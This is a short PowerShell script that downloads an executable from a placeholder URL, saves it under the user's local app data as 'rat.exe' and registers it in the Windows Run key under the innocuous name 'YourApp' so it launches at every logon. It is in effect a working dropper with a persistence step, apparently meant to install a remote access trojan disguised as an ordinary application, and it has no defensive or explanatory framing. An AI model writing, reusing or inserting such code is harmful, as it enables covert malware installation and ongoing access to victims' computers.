$url = "https://example.com/yourapp.exe"
$dest = "$env:LOCALAPPDATA\smthcool\rat.exe"
$name = "YourApp"

New-Item -ItemType Directory -Path (Split-Path $dest) -Force | Out-Null
Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name $name -Value $dest
